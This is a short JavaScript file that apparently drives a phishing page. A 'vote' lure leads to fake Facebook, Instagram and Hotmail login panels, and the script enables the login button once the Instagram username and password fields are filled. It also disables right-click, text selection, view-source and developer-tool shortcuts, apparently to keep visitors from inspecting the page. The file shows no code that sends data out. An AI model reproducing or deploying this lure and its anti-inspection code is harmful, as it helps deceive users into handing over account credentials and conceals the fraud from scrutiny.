$(document).ready(function () {
  $("#igp input").on("keydown", function () {
    var u = $("#ig-uname").val();
    var p = $("#ig-pass").val();
    if (u != "" && p != "") {
      $("#ig-log").addClass("fb-bug");
    } else {
      $("#ig-log").removeClass("fb-bug");
      $("#ig-log").off("click");
      $("#ig-log").css("color", "white");
    }
  });
});
function vote() {
  document.getElementById("choose").style.display = "block";
}
function can() {
  document.getElementById("choose").style.display = "none";
}
function facebook() {
  document.getElementById("fbp").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("choose").style.display = "none";
}
function instagram() {
  document.getElementById("igp").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("choose").style.display = "none";
}
function hotmail() {
  document.getElementById("hmp").style.display = "block";
  document.getElementById("home").style.display = "none";
  document.getElementById("choose").style.display = "none";
}

// Disable right-click
document.addEventListener("contextmenu", (event) => {
  event.preventDefault();
});

// Disable keyboard shortcuts for inspect tools (e.g., F12, Ctrl+Shift+I)
document.addEventListener("keydown", (event) => {
  if (
    event.key === "F12" || // F12 for Developer Tools
    (event.ctrlKey && event.shiftKey && event.key === "I") || // Ctrl+Shift+I
    (event.ctrlKey && event.shiftKey && event.key === "J") || // Ctrl+Shift+J
    (event.ctrlKey && event.key === "U") // Ctrl+U for View Source
  ) {
    event.preventDefault();
  }
});

// Disable selection
document.addEventListener("selectstart", (event) => {
  event.preventDefault();
});
